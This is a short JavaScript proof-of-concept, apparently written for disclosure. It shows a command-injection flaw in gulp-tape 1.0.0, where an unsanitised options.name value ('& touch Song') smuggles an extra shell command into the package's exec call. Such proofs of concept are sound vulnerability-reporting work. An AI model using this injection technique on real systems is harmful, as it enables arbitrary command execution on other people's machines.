/**
 * gulp-tape@1.0.0 is vulnerable to commnand injection.
 * the injection point is located in line38 in index file "index.js" of the package.
 * the argument "options" in exported function gulpTape() can be controlled by 
 * users without any sanitization.
 */

var root = require("gulp-tape");
var gulp = require("gulp");
var options = {
  name: "& touch Song"
}
gulp.src("./gulp-tape.js")
  .pipe(root(options));
